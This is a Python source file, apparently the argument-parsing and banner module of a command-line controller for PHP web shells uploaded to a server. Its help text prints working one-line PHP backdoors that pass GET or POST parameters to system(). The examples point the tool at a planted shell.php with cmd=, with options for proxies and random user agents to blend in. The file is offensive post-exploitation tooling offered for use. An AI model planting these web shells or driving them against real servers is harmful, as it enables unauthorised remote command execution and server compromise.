from sys import argv
import argparse


class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    BLUE = '\033[94m'
    YELLOW = '\033[93m'
    HOT = '\033[97m'
    END = '\033[0m'


class Banner(object):
    banner = """{0}
\t\t __         ______   ______   .___  ___. .___  ___.      ___      .__   __.  _______
\t\t|  |       /      | /  __  \  |   \/   | |   \/   |     /   \     |  \ |  | |       \\
\t\t|  |      |  ,----'|  |  |  | |  \  /  | |  \  /  |    /  ^  \    |   \|  | |  .--.  |
\t\t|  |      |  |     |  |  |  | |  |\/|  | |  |\/|  |   /  /_\  \   |  . `  | |  |  |  |
\t\t|  |      |  `----.|  `--'  | |  |  |  | |  |  |  |  /  _____  \  |  |\   | |  '--'  |
\t\t|__|       \______| \______/  |__|  |__| |__|  |__| /__/     \__\ |__| \__| |_______/
\t\t--------------------------------------------------------------------------------------
{1}""".format(Colors.YELLOW, Colors.END)


class GetArgs(object):
    if len(argv) <= 1:
        print'''
{hot}-- Command controler for PHP system functions. --
--   Which works for POST and GET requests:    --{end}

{yellow}1-   <?php system($_GET['parameter']); ?>
2-   <?php system($_POST['parameter']); ?>{end}

run {red}{script} -h{end} for help'''.format(script=argv[0], hot=Colors.HOT, yellow=Colors.YELLOW, red=Colors.RED, end=Colors.END)
        exit(1)
    else:
        parser = argparse.ArgumentParser(
                add_help=False,
                usage='%(prog)s -h',
                formatter_class=argparse.RawDescriptionHelpFormatter,
                epilog='''
        Examples:
        python %(prog)s --url http://www.mywebsite.com/shell.php?cmd= --proxy http://127.0.0.1:8080
        python %(prog)s --url http://www.mywebsite.com/shell.php --method POST --parameter cmd
        python %(prog)s --url http://www.mywebsite.com/shell.php?cmd= --random-agent
            ''')
        positional = parser.add_argument_group('Positional arguments')
        positional.add_argument('-u', '--url', help='Full URL for the uploaded PHP code', metavar='')
        optional = parser.add_argument_group('Optional arguments')
        optional.add_argument('-h', '--help', action='help', help='Print this help message then exit')
        optional.add_argument('-m', '--method', dest='method', help='The method used in the uploaded PHP code (e.g. post)', metavar='')
        optional.add_argument('-p', '--parameter', dest='parameter', help='Parameter that used in the shell (e.g. cmd)', metavar='')
        optional.add_argument('-x', '--proxy', dest='proxy', help='Proxy (e.g. \'http://127.0.0.1:8080\')', metavar='')
        optional.add_argument('-g', '--agent', dest='agent', help='user-agent (e.g. \'Mozilla/5.0\')', metavar='')
        optional.add_argument('-rg', '--random-agent', dest='random_agent', help='icommand will use some random user-agent', action='store_true')
        options = parser.parse_args()
        url = options.url
        method = options.method.lower() if options.method else None
        parameter = options.parameter
        proxy = options.proxy
        agent = options.agent
        random_agent = options.random_agent

getargs = GetArgs()
get_banner = Banner().banner
